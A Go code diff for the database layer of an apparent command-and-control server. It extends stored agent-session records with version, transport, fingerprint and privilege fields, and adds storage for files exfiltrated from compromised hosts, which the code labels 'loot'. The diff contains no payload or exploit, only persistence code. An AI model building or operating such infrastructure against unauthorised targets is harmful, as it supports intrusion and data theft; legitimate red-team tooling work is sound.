@@ -22,20 +22,24 @@ type DB struct {
 
 // SessionRecord represents a stored session.
 type SessionRecord struct {
-	ID        string
-	AgentID   string
-	Hostname  string
-	OS        string
-	Arch      string
-	Username  string
-	IsAdmin   bool
-	PublicIP  string
-	LocalIP   string
-	MACAddr   string
-	FirstSeen time.Time
-	LastSeen  time.Time
-	State     string
-	TaskCount int
+	ID           string
+	AgentID      string
+	Hostname     string
+	OS           string
+	Arch         string
+	Username     string
+	IsAdmin      bool
+	PublicIP     string
+	LocalIP      string
+	MACAddr      string
+	FirstSeen    time.Time
+	LastSeen     time.Time
+	State        string
+	TaskCount    int
+	AgentVersion string
+	Transport    string
+	Fingerprint  string
+	Privilege    string
 }
 
 // TaskRecord represents a stored task.
@@ -123,6 +127,11 @@ func OpenWithEncryption(dsn string, masterKey []byte) (*DB, error) {
 		}
 		db.enc = enc
 		log.Println("[DB] At-rest encryption enabled (AES-256-GCM, PBKDF2-SHA256 x600000 stretched key)")
+
+		// Converge pre-v2 ciphertext (bare sha256 key) to the
+		// stretched format: skipped rows stay readable via the
+		// legacy path anyway.
+		db.reencryptLegacyColumns()
 	}
 
 	return db, nil
@@ -162,17 +171,22 @@ func (d *DB) UpsertSession(s *SessionRecord) error {
 	defer d.mu.Unlock()
 
 	_, err := d.conn.Exec(`
-                INSERT INTO sessions (id, agent_id, hostname, os, arch, username, is_admin, public_ip, local_ip, mac_address, last_seen, state)
-                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+                INSERT INTO sessions (id, agent_id, hostname, os, arch, username, is_admin, public_ip, local_ip, mac_address, last_seen, state,
+                                      agent_version, transport, fingerprint, privilege)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                 ON CONFLICT(id) DO UPDATE SET
                         hostname=excluded.hostname, os=excluded.os, arch=excluded.arch,
                         username=excluded.username, is_admin=excluded.is_admin,
                         public_ip=excluded.public_ip, local_ip=excluded.local_ip,
                         mac_address=excluded.mac_address, last_seen=excluded.last_seen,
-                        state=excluded.state`,
+                        state=excluded.state,
+                        agent_version=excluded.agent_version, transport=excluded.transport,
+                        fingerprint=CASE WHEN excluded.fingerprint != '' THEN excluded.fingerprint ELSE sessions.fingerprint END,
+                        privilege=excluded.privilege`,
 		s.ID, s.AgentID, s.Hostname, s.OS, s.Arch, s.Username,
 		boolToInt(s.IsAdmin), s.PublicIP, s.LocalIP, s.MACAddr,
 		s.LastSeen, s.State,
+		s.AgentVersion, s.Transport, s.Fingerprint, s.Privilege,
 	)
 	return err
 }
@@ -205,11 +219,13 @@ func (d *DB) GetSession(id string) (*SessionRecord, error) {
 	err := d.conn.QueryRow(`
                 SELECT id, agent_id, hostname, os, arch, username, is_admin,
                            public_ip, local_ip, mac_address, first_seen, last_seen, state,
+                           COALESCE(agent_version,''), COALESCE(transport,''), COALESCE(fingerprint,''), COALESCE(privilege,''),
                            (SELECT COUNT(*) FROM tasks WHERE session_id=sessions.id) as task_count
                 FROM sessions WHERE id=?`, id).Scan(
 		&s.ID, &s.AgentID, &s.Hostname, &s.OS, &s.Arch, &s.Username,
 		&isAdmin, &s.PublicIP, &s.LocalIP, &s.MACAddr,
-		&s.FirstSeen, &s.LastSeen, &s.State, &s.TaskCount,
+		&s.FirstSeen, &s.LastSeen, &s.State,
+		&s.AgentVersion, &s.Transport, &s.Fingerprint, &s.Privilege, &s.TaskCount,
 	)
 	if err != nil {
 		return nil, err
@@ -227,11 +243,13 @@ func (d *DB) GetSessionByAgentID(agentID string) (*SessionRecord, error) {
 	var isAdmin int
 	err := d.conn.QueryRow(`
                 SELECT id, agent_id, hostname, os, arch, username, is_admin,
-                           public_ip, local_ip, mac_address, first_seen, last_seen, state
+                           public_ip, local_ip, mac_address, first_seen, last_seen, state,
+                           COALESCE(agent_version,''), COALESCE(transport,''), COALESCE(fingerprint,''), COALESCE(privilege,'')
                 FROM sessions WHERE agent_id=?`, agentID).Scan(
 		&s.ID, &s.AgentID, &s.Hostname, &s.OS, &s.Arch, &s.Username,
 		&isAdmin, &s.PublicIP, &s.LocalIP, &s.MACAddr,
 		&s.FirstSeen, &s.LastSeen, &s.State,
+		&s.AgentVersion, &s.Transport, &s.Fingerprint, &s.Privilege,
 	)
 	if err != nil {
 		return nil, err
@@ -248,6 +266,7 @@ func (d *DB) ListActiveSessions() ([]SessionRecord, error) {
 	rows, err := d.conn.Query(`
                 SELECT id, agent_id, hostname, os, arch, username, is_admin,
                            public_ip, local_ip, mac_address, first_seen, last_seen, state,
+                           COALESCE(agent_version,''), COALESCE(transport,''), COALESCE(fingerprint,''), COALESCE(privilege,''),
                            (SELECT COUNT(*) FROM tasks WHERE session_id=sessions.id) as task_count
                 FROM sessions WHERE state != 'dead' ORDER BY last_seen DESC`)
 	if err != nil {
@@ -266,6 +285,7 @@ func (d *DB) ListAllSessions() ([]SessionRecord, error) {
 	rows, err := d.conn.Query(`
                 SELECT id, agent_id, hostname, os, arch, username, is_admin,
                            public_ip, local_ip, mac_address, first_seen, last_seen, state,
+                           COALESCE(agent_version,''), COALESCE(transport,''), COALESCE(fingerprint,''), COALESCE(privilege,''),
                            (SELECT COUNT(*) FROM tasks WHERE session_id=sessions.id)
                 FROM sessions ORDER BY last_seen DESC`)
 	if err != nil {
@@ -743,7 +763,8 @@ func scanSessions(rows *sql.Rows) ([]SessionRecord, error) {
 		var isAdmin int
 		if err := rows.Scan(&s.ID, &s.AgentID, &s.Hostname, &s.OS, &s.Arch,
 			&s.Username, &isAdmin, &s.PublicIP, &s.LocalIP, &s.MACAddr,
-			&s.FirstSeen, &s.LastSeen, &s.State, &s.TaskCount); err != nil {
+			&s.FirstSeen, &s.LastSeen, &s.State,
+			&s.AgentVersion, &s.Transport, &s.Fingerprint, &s.Privilege, &s.TaskCount); err != nil {
 			return nil, err
 		}
 		s.IsAdmin = isAdmin != 0
@@ -887,4 +908,57 @@ func (d *DB) DeleteWebhook(id string) (bool, error) {
 		return false, err
 	}
 	return n > 0, nil
+}
+
+// FileRecord represents a persisted exfiltrated-file entry (loot).
+type FileRecord struct {
+	ID        string
+	SessionID string
+	Filename  string
+	Module    string
+	Size      int64
+	Path      string
+	Created   time.Time
+}
+
+// InsertFileRecord persists a loot entry (idempotent by id: re-finalizing the
+// same transfer must not duplicate the listing row).
+func (d *DB) InsertFileRecord(fr *FileRecord) error {
+	d.mu.Lock()
+	defer d.mu.Unlock()
+
+	_, err := d.conn.Exec(`
+                INSERT INTO file_records (id, session_id, filename, module, size, path, created)
+                VALUES (?, ?, ?, ?, ?, ?, COALESCE(?, CURRENT_TIMESTAMP))
+                ON CONFLICT(id) DO NOTHING`,
+		fr.ID, fr.SessionID, fr.Filename, fr.Module, fr.Size, fr.Path, fr.Created,
+	)
+	return err
+}
+
+// ListFileRecords returns every persisted loot entry, newest first.
+func (d *DB) ListFileRecords() ([]FileRecord, error) {
+	d.mu.RLock()
+	defer d.mu.RUnlock()
+
+	rows, err := d.conn.Query(`SELECT id, session_id, filename, module, size, path, created FROM file_records ORDER BY created DESC`)
+	if err != nil {
+		return nil, err
+	}
+	defer rows.Close()
+
+	var out []FileRecord
+	for rows.Next() {
+		var fr FileRecord
+		// created is nullable (DEFAULT CURRENT_TIMESTAMP only fires when the
+		// column is omitted); scan through NullTime to avoid the driver's
+		// type-tainting of COALESCE expressions.
+		var created sql.NullTime
+		if err := rows.Scan(&fr.ID, &fr.SessionID, &fr.Filename, &fr.Module, &fr.Size, &fr.Path, &created); err != nil {
+			return nil, err
+		}
+		fr.Created = created.Time
+		out = append(out, fr)
+	}
+	return out, rows.Err()
 }
